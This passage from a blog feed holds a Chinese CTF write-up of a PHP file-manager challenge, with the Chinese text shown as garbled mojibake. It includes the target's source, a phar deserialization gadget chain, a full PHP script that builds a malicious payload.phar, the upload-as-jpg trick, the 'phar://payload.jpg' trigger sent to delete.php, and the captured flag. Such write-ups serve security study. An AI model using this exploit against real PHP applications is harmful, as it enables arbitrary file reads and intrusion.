class="hljs-string">&#x27;&lt;/td&gt;&#x27;</span>;<br>            &#125;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . <span class="hljs-title function_ invoke__">htmlentities</span>(<span class="hljs-variable">$filename</span>) . <span class="hljs-string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;&#x27;</span>;<br>            <span class="hljs-variable">$table</span> .= <span class="hljs-string">&#x27;&lt;/tr&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$table</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// æ–‡ä»¶ç±»</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-comment">// openæ–¹æ³•</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename = <span class="hljs-variable">$filename</span>;<br>        <span class="hljs-comment">// file_exists()å‡½æ•°ä¸ºå±é™©å‡½æ•°ï¼Œå¯ä»¥ç”¨äºè§¦å‘pharååºåˆ—åŒ–</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; !<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// è·å–æ–‡ä»¶çš„æ–‡ä»¶å</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">name</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>    <span class="hljs-comment">// è®¡ç®—æ–‡ä»¶çš„å¤§å°ï¼Œå¹¶è¿”å›å¤§å°å¸¦å•ä½</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">size</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$size</span> = <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        <span class="hljs-variable">$units</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27; B&#x27;</span>, <span class="hljs-string">&#x27; KB&#x27;</span>, <span class="hljs-string">&#x27; MB&#x27;</span>, <span class="hljs-string">&#x27; GB&#x27;</span>, <span class="hljs-string">&#x27; TB&#x27;</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$size</span> &gt;= <span class="hljs-number">1024</span> &amp;&amp; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">4</span>; <span class="hljs-variable">$i</span>++) <span class="hljs-variable">$size</span> /= <span class="hljs-number">1024</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">round</span>(<span class="hljs-variable">$size</span>, <span class="hljs-number">2</span>).<span class="hljs-variable">$units</span>[<span class="hljs-variable">$i</span>];<br>    &#125;<br>    <span class="hljs-comment">// æ–‡ä»¶åˆ é™¤å‡½æ•°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">detele</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">// unlinkå‡½æ•°ä¸ºå±é™©å‡½æ•°ï¼Œç”¨äºè§¦å‘pharååºåˆ—åŒ–</span><br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>    <span class="hljs-comment">// æ–‡ä»¶å…³é—­å‡½æ•°</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">// file_get_contents()å‡½æ•°å¯ä»¥è·å–æ–‡ä»¶çš„å†…å®¹ï¼Œå®ƒå¯ä»¥è¿”å›å†…å®¹ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¯¥å‡½æ•°è¿”å›æˆ‘ä»¬éœ€è¦çš„flagæ–‡ä»¶ä¿¡æ¯</span><br>        <span class="hljs-comment">// è§¦å‘æ–‡ä»¶æ‰“å¼€å‡½æ•°éœ€è¦è°ƒç”¨fileç±»çš„close()å‡½æ•°ï¼ŒUserç±»çš„__destruct()é­”æœ¯æ–¹æ³•ä¸­è°ƒç”¨äº†è¯¥å‡½æ•°</span><br>        <span class="hljs-comment">// flagä¸€èˆ¬å­˜åœ¨äºflag.txtæ–‡ä»¶ä¸­æˆ–flag.php</span><br>        <span class="hljs-comment">// $this-&gt;filename = flag.txt </span><br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="download-php"><a href="#download-php" class="headerlink" title="download.php:"></a>download.php:</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-comment">//å¦‚æœä¼šè¯æ•°ç»„ä¸­loginå‚æ•°çš„å€¼ä¸ºç©º</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-comment">//æ£€æµ‹filenameå‚æ•°æ˜¯å¦ä¸ºç©º</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-comment">//å¼•ç”¨å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„class.phpæ–‡ä»¶</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><span class="hljs-comment">//é™åˆ¶è®¿é—®ç›®å½•ä¸ºå½“å‰æ–‡ä»¶æ‰€åœ¨ç›®å½•ï¼Œ/etcç›®å½•å’Œ/tmpç›®å½•</span><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;open_basedir&quot;</span>, <span class="hljs-title function_ invoke__">getcwd</span>() . <span class="hljs-string">&quot;:/etc:/tmp&quot;</span>);<br><br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br><span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-comment">//åˆ¤æ–­æ–‡ä»¶åçš„é•¿åº¦æ˜¯å¦&lt;40,æ–‡ä»¶å†…å®¹æ˜¯å¦ä¸ºç©ºï¼Œæ–‡ä»¶åä¸­æ˜¯å¦å­˜åœ¨flagï¼Œæ‰€ä»¥å®ƒæ˜¯ç¦æ­¢æˆ‘ä»¬è®¿é—®æœ‰flagçš„æ–‡ä»¶ï¼Œè¿™é‡Œä¹Ÿæš—ç¤ºäº†ç½‘ç«™å†…éƒ¨å¯èƒ½å­˜åœ¨flagæ–‡ä»¶åç›¸å…³çš„æ–‡ä»¶</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$filename</span>) &amp;&amp; <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;flag&quot;</span>) === <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/octet-stream&quot;</span>);<br>    <span class="hljs-comment">//å°†æ–‡ä»¶åéƒ¨åˆ†æ˜¾ç¤º</span><br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$filename</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;File not exist&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="delete-php"><a href="#delete-php" class="headerlink" title="delete.php:"></a>delete.php:</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-comment">// æ£€æŸ¥ç”¨æˆ·æ˜¯å¦ç™»å½•</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-comment">// æ£€æŸ¥æ–‡ä»¶åæ˜¯å¦ä¸ºç©º</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;class.php&quot;</span>;<br><br><span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;sandbox&#x27;</span>]);<br><span class="hljs-comment">// ç”³è¯·æ–‡ä»¶ç±»ï¼Œå­˜åœ¨äºclass.phpä¸­</span><br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>();<br><span class="hljs-comment">// è·å–æ–‡ä»¶å</span><br><span class="hljs-variable">$filename</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-comment">// åˆ¤æ–­æ–‡ä»¶åæ˜¯å¦&lt;40</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>) &lt; <span class="hljs-number">40</span> &amp;&amp; <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$filename</span>)) &#123;<br>    <span class="hljs-comment">// detele()å‡½æ•°å¯ä»¥è§¦å‘fileç±»ä¸­çš„unlink()å‡½æ•°çš„pharååºåˆ—åŒ–</span><br>    <span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">detele</span>();<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>    <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">Header</span>(<span class="hljs-string">&quot;Content-type: application/json&quot;</span>);<br>    <span class="hljs-variable">$response</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;success&quot;</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;error&quot;</span> =&gt; <span class="hljs-string">&quot;File not exist&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$response</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="ç†æƒ³çš„é“¾å­"><a href="#ç†æƒ³çš„é“¾å­" class="headerlink" title="ç†æƒ³çš„é“¾å­:"></a>ç†æƒ³çš„é“¾å­:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs txt">1.è§¦å‘æ–‡ä»¶æ‰“å¼€å‡½æ•°:<br>$this-&gt;filename=flag.txt;<br>file_get_contents($this-&gt;filename);<br><br>2.è§¦å‘Fileç±»çš„close()å‡½æ•°:<br>User-&gt;__destruct()=&gt;File-&gt;close<br><br>3.è§¦å‘é­”æœ¯æ–¹æ³•__destruct()<br>new $User<br><br>delete.php=&gt;$file-&gt;detele();=&gt;unlink($this-&gt;filename);=&gt;User-&gt;__destruct()=&gt;File-&gt;close()<br>=&gt;file_get_contents($this-&gt;filename);<br><br></code></pre></td></tr></table></figure><p><strong>ä½†æ˜¯ç”±äºreturn file_get_contents($this-&gt;filename);åªæ˜¯è¿”å›å‡½æ•°çš„å€¼ï¼Œä¸èƒ½å°†å‡½æ•°çš„è¿”å›å€¼æ˜¾ç¤ºåˆ°ç½‘é¡µä¸­ï¼Œå¿…é¡»é€šè¿‡htmlè¯­è¨€æˆ–echoå‡½æ•°æˆ–printå‡½æ•°æ‰èƒ½æ˜¾ç¤ºåˆ°ç½‘é¡µä¸­ï¼Œæ‰€ä»¥éœ€è¦åˆ©ç”¨FileListç±»çš„__destruct()å‡½æ•°</strong></p><h5 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ:"></a>åˆ†æ:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs txt">FileList=&gt;__destruct():<br><br>foreach ($this-&gt;results as $filename =&gt; $result) &#123;<br>            $table .= &#x27;&lt;tr&gt;&#x27;;<br>            foreach ($result as $func =&gt; $value) &#123;<br>                $table .= &#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27; . htmlentities($value) . &#x27;&lt;/td&gt;&#x27;;<br>            &#125;<br>            $table .= &#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27; . htmlentities($filename) . &#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;&#x27;;<br>            $table .= &#x27;&lt;/tr&gt;&#x27;;<br>        &#125;<br>        echo $table;<br>        <br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°å¯ä»¥ç”¨äºè¾“å‡ºresultç»“æœé›†åˆ°ç½‘é¡µä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿™ä¸ªç»“æœé›†çš„å†…å®¹ä¸ºflag.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// é€šè¿‡è°ƒç”¨è¯¥ç±»çš„ä¸å­˜åœ¨å‡½æ•°å¯ä»¥è§¦å‘è¯¥é­”æœ¯æ–¹æ³•</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$args</span></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$this</span>-&gt;funcs, <span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;files <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>            <span class="hljs-comment">//å¯¹resultsç»“æœé›†è¿›è¡Œèµ‹å€¼</span><br>            <span class="hljs-comment">//å¯ä»¥è®©$file-&gt;$func();ä¸ºFile-&gt;close();</span><br>            <span class="hljs-variable language_">$this</span>-&gt;results[<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">name</span>()][<span class="hljs-variable">$func</span>] = <span class="hljs-variable">$file</span>-&gt;<span class="hljs-variable">$func</span>();<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h5 id="çŸ¥è¯†ç‚¹ä»‹ç»"><a href="#çŸ¥è¯†ç‚¹ä»‹ç»" class="headerlink" title="çŸ¥è¯†ç‚¹ä»‹ç»:"></a>çŸ¥è¯†ç‚¹ä»‹ç»:</h5><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs txt">$table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27; . htmlentities($func) . &#x27;&lt;/th&gt;&#x27;;<br>è¿™æ®µä»£ç çš„ä½œç”¨æ˜¯å°†å˜é‡ $func çš„å€¼ç»è¿‡ htmlentities() å‡½æ•°è¿›è¡Œ HTML å®ä½“è½¬æ¢ï¼Œå¹¶æ‹¼æ¥åˆ°å­—ç¬¦ä¸² &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27; å’Œ &#x27;&lt;/th&gt;&#x27; ä¹‹é—´ï¼Œç„¶åå°†ç»“æœè¿½åŠ åˆ°å˜é‡ $table ä¸­ã€‚<br><br>htmlentities() å‡½æ•°ç”¨äºå°†å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ï¼Œè¿™æ ·å¯ä»¥åœ¨ HTML é¡µé¢ä¸­å®‰å…¨åœ°æ˜¾ç¤ºè¿™äº›å­—ç¬¦ï¼Œé¿å…è¢«è¯¯è§£ä¸º HTML æ ‡ç­¾æˆ–å…¶ä»–è¯­æ³•ã€‚<br><br>ä¾‹å¦‚ï¼Œå¦‚æœ $func çš„å€¼ä¸º &quot;Hello World&quot;ï¼Œç»è¿‡ htmlentities() è½¬æ¢åå¯èƒ½ä¼šå˜æˆ &quot;Hello World&quot;ï¼ˆå‡è®¾åŸå§‹å­—ç¬¦ä¸²ä¸­æ²¡æœ‰ç‰¹æ®Šå­—ç¬¦ï¼‰ã€‚<br><br>æœ€ç»ˆï¼Œ$table å˜é‡å¯èƒ½ä¼šåŒ…å«ç±»ä¼¼ä»¥ä¸‹å†…å®¹çš„å­—ç¬¦ä¸²ï¼š<br><br>html<br>&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Hello World&lt;/th&gt;<br>è¿™æ®µä»£ç çš„ä½œç”¨æ˜¯åœ¨ä¸€ä¸ª HTML è¡¨æ ¼çš„æ ‡é¢˜è¡Œä¸­æ·»åŠ ä¸€ä¸ªå•å…ƒæ ¼ï¼Œå•å…ƒæ ¼å†…å®¹ä¸ºç»è¿‡è½¬ä¹‰å¤„ç†çš„ $func å˜é‡çš„å€¼ã€‚<br></code></pre></td></tr></table></figure><h3 id="æ„é€ pharååºåˆ—åŒ–é“¾å­"><a href="#æ„é€ pharååºåˆ—åŒ–é“¾å­" class="headerlink" title="æ„é€ pharååºåˆ—åŒ–é“¾å­:"></a>æ„é€ pharååºåˆ—åŒ–é“¾å­:</h3><h4 id="é“¾å­"><a href="#é“¾å­" class="headerlink" title="é“¾å­:"></a>é“¾å­:</h4><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs txt">1.è§¦å‘æ–‡ä»¶æ‰“å¼€å‡½æ•°:<br>$this-&gt;filename=flag.txt;<br>file_get_contents($this-&gt;filename);<br><br>2.è§¦å‘Fileç±»çš„close()å‡½æ•°:<br>FileList-&gt;__call()=&gt;File-&gt;close=&gt;file_get_contents($this-&gt;filename);<br><br>3.è§¦å‘FileListç±»çš„callå‡½æ•°:<br>User-&gt;$db=new FileList();<br>$this-&gt;db-&gt;close();=&gt;FileList-&gt;__call()=&gt;FileList-&gt;__call()=&gt;File-&gt;close=&gt;file_get_contents($this-&gt;filename);<br><br>4.è§¦å‘$this-&gt;db-&gt;close();<br>User-&gt;__destruct()=&gt;$this-&gt;db-&gt;close();=&gt;FileList-&gt;__call()=&gt;FileList-&gt;__call()=&gt;File-&gt;close=&gt;file_get_contents($this-&gt;filename);<br></code></pre></td></tr></table></figure><h4 id="æ„é€ pharååºåˆ—åŒ–"><a href="#æ„é€ pharååºåˆ—åŒ–" class="headerlink" title="æ„é€ pharååºåˆ—åŒ–:"></a>æ„é€ pharååºåˆ—åŒ–:</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileList</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;files = <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>());<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">File</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/flag.txt&quot;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$db</span>;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br><span class="hljs-variable">$a</span>-&gt;db = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileList</span>();<br><br><span class="hljs-comment">// åˆ é™¤å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„payload.pharæ–‡ä»¶</span><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&#x27;payload.phar&#x27;</span>);<br><span class="hljs-comment">// ç”Ÿæˆçš„æ–‡ä»¶åä¸º1.phar</span><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;payload.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$o</span> = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><h3 id="å°†payload-pharæ–‡ä»¶åç¼€åæ”¹ä¸ºpayload-jpgåä¸Šä¼ "><a href="#å°†payload-pharæ–‡ä»¶åç¼€åæ”¹ä¸ºpayload-jpgåä¸Šä¼ " class="headerlink" title="å°†payload.pharæ–‡ä»¶åç¼€åæ”¹ä¸ºpayload.jpgåä¸Šä¼ :"></a>å°†payload.pharæ–‡ä»¶åç¼€åæ”¹ä¸ºpayload.jpgåä¸Šä¼ :</h3><p><img src="/images/2024-2-3-Dropbox/image-20240128202026584.png" alt="image-20240128202026584"></p><h3 id="ä½¿ç”¨æŠ“åŒ…åˆ é™¤è¯¥æ–‡ä»¶"><a href="#ä½¿ç”¨æŠ“åŒ…åˆ é™¤è¯¥æ–‡ä»¶" class="headerlink" title="ä½¿ç”¨æŠ“åŒ…åˆ é™¤è¯¥æ–‡ä»¶:"></a>ä½¿ç”¨æŠ“åŒ…åˆ é™¤è¯¥æ–‡ä»¶:</h3><p><img src="/images/2024-2-3-Dropbox/image-20240128202052113.png" alt="image-20240128202052113"></p><h3 id="è§¦å‘delete-phpçš„pharååºåˆ—åŒ–"><a href="#è§¦å‘delete-phpçš„pharååºåˆ—åŒ–" class="headerlink" title="è§¦å‘delete.phpçš„pharååºåˆ—åŒ–:"></a>è§¦å‘delete.phpçš„pharååºåˆ—åŒ–:</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">filename=phar://payload.jpg<br></code></pre></td></tr></table></figure><p><img src="/images/2024-2-3-Dropbox/image-20240128202146031.png" alt="image-20240128202146031"></p><p>æˆåŠŸè·å–åˆ°flag:</p><p><img src="/images/2024-2-3-Dropbox/image-20240128202214425.png" alt="image-20240128202214425"></p><p>flag&#x3D;flag{336ab512-3062-4ec1-96e6-5ca89194615c}</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF [b01lers2020]Welcome to Earth</title>
    <link href="/2024/02/03/2024-2-3-Welcome%20to%20Earth/"/>
